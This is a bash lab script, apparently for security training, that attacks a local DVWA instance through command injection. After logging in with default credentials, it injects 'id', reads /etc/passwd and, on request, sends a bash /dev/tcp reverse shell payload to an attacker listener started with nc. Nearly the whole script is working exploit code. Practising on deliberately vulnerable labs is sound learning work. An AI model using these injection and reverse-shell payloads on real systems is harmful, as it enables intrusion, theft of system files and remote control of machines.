#!/bin/bash
# =====================================================================
# lab_cmdi.sh — Command Injection + Reverse Shell sur DVWA
# Usage: bash lab_cmdi.sh [reverseshell]
# =====================================================================
set -uo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/../../.." && pwd)/env.sh"

DVWA="http://localhost:$DVWA_PORT"
COOKIES=$(mktemp)
CURL="curl -s --connect-timeout 5 --max-time 15"

cleanup() { rm -f "$COOKIES"; }
trap cleanup EXIT

# Login
TOKEN=$($CURL -c "$COOKIES" "http://localhost:$DVWA_PORT/login.php" | grep -oP "user_token' value='\K[a-f0-9]+")
$CURL -c "$COOKIES" -b "$COOKIES" -X POST "http://localhost:$DVWA_PORT/login.php" \
  -d "username=admin&password=password&user_token=$TOKEN&Login=Login" -o /dev/null

SESSION=$(grep PHPSESSID "$COOKIES" | awk '{print $NF}')
echo "[*] Session: PHPSESSID=$SESSION"

echo ""
echo "=== COMMAND INJECTION — DVWA ==="
echo ""

echo "--- 1. Basic command injection ---"
echo "Payload: 127.0.0.1; id"
curl -s -b "PHPSESSID=$SESSION;security=low" \
  -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;+id&Submit=Submit" \
  | awk '/<pre>/,/<\/pre>/' | sed 's/<[^>]*>//g'

echo ""
echo "--- 2. Read /etc/passwd ---"
echo "Payload: 127.0.0.1; cat /etc/passwd | head -3"
curl -s -b "PHPSESSID=$SESSION;security=low" \
  -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;+cat+/etc/passwd&Submit=Submit" \
  | awk '/<pre>/,/<\/pre>/' | sed 's/<[^>]*>//g'

echo ""
echo "--- 3. Reverse shell (optionnel: bash lab_cmdi.sh reverseshell) ---"
if [ "${1:-}" = "reverseshell" ]; then
  echo "[*] Démarrage du listener sur $LHOST:$LPORT"
  echo "[*] Envoi du payload reverse shell..."
  echo "Payload: 127.0.0.1; bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
  # Démarrer listener en arrière-plan
  timeout 10 nc -lvnp "$LPORT" &
  sleep 1
  PAYLOAD="127.0.0.1; bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
  curl -s -b "PHPSESSID=$SESSION;security=low" \
    -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
    --data-urlencode "ip=$PAYLOAD" \
    -d "Submit=Submit" \
    -o /dev/null
  wait
else
  echo "[*] Pour lancer un reverse shell: bash lab_cmdi.sh reverseshell"
fi
